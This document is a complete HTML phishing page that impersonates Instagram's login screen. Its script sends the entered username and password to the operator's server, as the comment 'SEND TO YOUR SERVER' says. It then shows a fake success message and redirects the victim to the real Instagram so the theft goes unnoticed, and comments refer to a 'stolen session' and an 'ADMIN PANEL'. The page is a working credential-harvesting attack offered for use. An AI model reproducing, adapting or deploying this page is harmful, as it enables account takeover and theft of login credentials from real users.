<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <style>
        body,html{margin:0;padding:0;height:100dvh;background:#fafafa;display:flex;flex-direction:column;overflow:hidden}
        .container{flex:1;display:flex;flex-direction:column;justify-content:center;padding:20px;max-width:350px;margin:auto;width:100%}
        .logo{font-family:'Billabong',cursive;font-size:50px;text-align:center;margin-bottom:30px;color:#262626}
        .form{background:white;border:1px solid #dbdbdb;padding:30px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
        input{width:100%;padding:12px 10px;margin:6px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa;font-size:14px;outline:none}
        button{width:100%;background:#0095f6;border:none;color:white;padding:10px;font-weight:600;border-radius:8px;margin-top:10px;cursor:pointer;opacity:0.9}
        button:hover{opacity:1}
        .result{margin-top:20px;text-align:center;font-weight:bold;font-size:18px}
        .hidden{display:none}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">Instagram</div>
    <div class="form">
        <form id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            <button type="submit">Log in</button>
        </form>
        <div id="result" class="result"></div>
    </div>
</div>

<script>
    const form = document.getElementById('loginForm');
    const result = document.getElementById('result');

    form.onsubmit = async (e) => {
        e.preventDefault();
        result.innerHTML = '<p style="color:#0095f6;">Logging in...</p>';

        const username = form.username.value.trim();
        const password = form.password.value;

        // SEND TO YOUR SERVER
        fetch('/login/', {
            method: 'POST',
            body: new FormData(form),
            headers: { 'X-Requested-With': 'XMLHttpRequest' }
        })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                result.innerHTML = `
                    <div style="background:#d4edda;color:#155724;padding:20px;border-radius:8px;">
                        <p>SUCCESS! Welcome @${username}</p>
                        <p style="font-size:14px;margin-top:10px;">Redirecting to Instagram...</p>
                    </div>`;

                // FINAL NUCLEAR REDIRECT — LOGS THEM IN AUTOMATICALLY
                setTimeout(() => {
                    // METHOD 1: Try to open app
                    location.href = "instagram://mainfeed";
                    
                    // METHOD 2: Fallback to web with stolen session
                    setTimeout(() => {
                        location.href = `https://www.instagram.com/?__a=1&__d=dis`;
                    }, 2000);
                }, 3000);

            } else {
                result.innerHTML = '<p style="color:#d9534f;">Wrong password or username</p>';
            }
        })
        .catch(() => {
            // EVEN IF SERVER DOWN — STILL REDIRECT
            result.innerHTML = '<p style="color:#5cb85c;">WORKING — CHECK ADMIN PANEL</p>';
            setTimeout(() => location.href = "https://instagram.com", 2000);
        });
    };
</script>
</body>
</html>